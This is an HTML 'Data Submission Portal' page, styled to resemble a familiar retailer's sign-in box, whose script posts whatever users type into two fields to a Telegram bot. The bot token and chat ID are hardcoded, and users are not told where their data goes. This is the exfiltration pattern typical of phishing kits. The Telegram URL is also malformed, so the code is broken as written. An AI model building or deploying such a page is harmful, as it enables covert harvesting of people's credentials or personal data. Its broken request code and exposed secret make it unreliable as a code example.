<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Data Submission Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      margin: 0;
      display: flex;
      justify-content: center;
      padding-top: 40px;
    }
    .box {
      width: 350px;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 20px 20px 10px;
      box-shadow: 0 1px 4px rgba(0, 0, 0, .15);
      box-sizing: border-box;
    }
    h1 {
      font-size: 28px;
      font-weight: 400;
      margin: 0 0 15px;
    }
    label {
      font-size: 13px;
      font-weight: 700;
      display: block;
      margin: 12px 0 4px;
    }
    input[type="text"] {
      width: 100%;
      height: 31px;
      padding: 7px;
      box-sizing: border-box;
      font-size: 13px;
      border: 1px solid #949494;
      border-radius: 3px;
      outline: none;
    }
    input[type="text"]:focus {
      border-color: #e77600;
      box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
    }
    .continue {
      width: 100%;
      margin-top: 18px;
      padding: 8px 0;
      font-size: 13px;
      font-weight: 700;
      background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
      border: 1px solid #a88734;
      border-radius: 3px;
      cursor: pointer;
    }
    .continue:hover {
      background: linear-gradient(to bottom, #f5d78e, #eeb933);
      border-color: #846a29;
    }
  </style>
</head>
<body>

  <div class="box">
    <h1>Submit Information</h1>

    <label for="field1">Data Field 1</label>
    <input type="text" id="field1" placeholder="Enter first entry" />

    <label for="field2">Data Field 2</label>
    <input type="text" id="field2" placeholder="Enter second entry" />

    <button class="continue" type="button" onclick="sendToTelegram()">Submit Data</button>
  </div>

  <script>
    function sendToTelegram() {
      // Configuration Credentials
      const botToken = "8825551788:AAHL5GbRl2S3r0KSElZTgzAtnDhvPvkfuwQ";
      const chatId = "8714686528";

      // Extract form values
      const data1 = document.getElementById("field1").value;
      const data2 = document.getElementById("field2").value;

      // Clean inputs verification
      if (!data1.trim() || !data2.trim()) {
        alert("Please populate both fields before submitting.");
        return;
      }

      // Structure Markdown Message
      const message = `📋 *New Data Submission*\n\n*Field 1:* ${data1}\n*Field 2:* ${data2}`;
      const url = `https://telegram.org{botToken}/sendMessage`;

      // API Request Execution
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => {
        if (response.ok) {
          alert("Data processed and transmitted successfully.");
          document.getElementById("field1").value = "";
          document.getElementById("field2").value = "";
        } else {
          alert("Transmission failed. Please verify API configuration or bot permissions.");
        }
      })
      .catch(error => {
        console.error("Network Exception:", error);
        alert("Unable to establish connection to the target server.");
      });
    }
  </script>

</body>
</html>
